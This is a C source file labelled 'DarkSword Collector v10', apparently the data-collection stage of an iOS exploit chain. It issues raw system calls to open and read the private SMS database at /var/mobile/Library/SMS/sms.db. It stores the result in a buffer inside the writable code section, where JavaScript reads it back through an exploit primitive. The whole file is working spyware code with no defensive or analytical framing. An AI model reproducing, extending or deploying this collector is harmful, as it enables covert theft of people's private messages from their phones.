/**
 * DarkSword Collector v10 - Buffer in __TEXT,__text (code section, RWX)
 * Exported result_buf and result_len for JS to read via cDylibBuf
 */

static int _strlen(const char *s) { int n=0; while(s[n]) n++; return n; }
static void _memcpy(char *dst, const char *src, int n) { for(int i=0;i<n;i++) dst[i]=src[i]; }
static int _itoa(int val, char *buf) {
    int i=0; char tmp[16]; int t=0;
    if(val==0){buf[0]='0';buf[1]=0;return 1;}
    while(val>0){tmp[t++]='0'+(val%10);val/=10;}
    for(int j=t-1;j>=0;j--) buf[i++]=tmp[j];
    buf[i]=0; return i;
}

static long _svc1(long n, long a) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory");
    return x0;
}
static long _svc2(long n, long a, long b) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory");
    return x0;
}
static long _svc3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory");
    return x0;
}

#define SYS_open  5
#define SYS_read  3
#define SYS_close 6

static void _stderr(const char *msg) {
    _svc3(4, 2, (long)msg, _strlen(msg));
}

/* Exported buffers in __TEXT,__text (confirmed writable - bootstrap patches branches here) */
__attribute__((section("__TEXT,__text")))
char result_buf[512] = {0};
__attribute__((section("__TEXT,__text")))
int result_len = 0;

static void _append(const char *s) {
    int sl = _strlen(s);
    int pos = result_len;
    if (pos + sl < 511) {
        _memcpy(result_buf + pos, s, sl);
        result_len = pos + sl;
        result_buf[result_len] = 0;
    }
}
static void _append_int(int v) { char b[16]; _itoa(v,b); _append(b); }

void ds_start(void) {
    result_buf[0] = 0;
    result_len = 0;
    _stderr("[v10] start\n");

    int fd = (int)_svc2(SYS_open, (long)"/var/mobile/Library/SMS/sms.db", 0);
    _stderr("[v10] fd=");
    char fb[8]; _itoa(fd, fb); _stderr(fb); _stderr("\n");

    if (fd >= 0) {
        char data[256];
        int n = (int)_svc3(SYS_read, fd, (long)data, sizeof(data)-1);
        _svc1(SYS_close, fd);
        if (n < 0) n = 0;
        data[n] = 0;

        _append("{\"SMS\":{\"ok\":true,\"size\":");
        _append_int(n);
        _append("}}");
    } else {
        _append("{\"SMS\":{\"ok\":false,\"fd\":");
        _append_int(fd);
        _append("}}");
    }

    _stderr("[v10] len=");
    char rlb[8]; _itoa(result_len, rlb); _stderr(rlb);
    _stderr(" buf[0]=");
    char bb[4]; bb[0]=result_buf[0]; bb[1]=0; _stderr(bb);
    _stderr("\n[v10] done\n");
}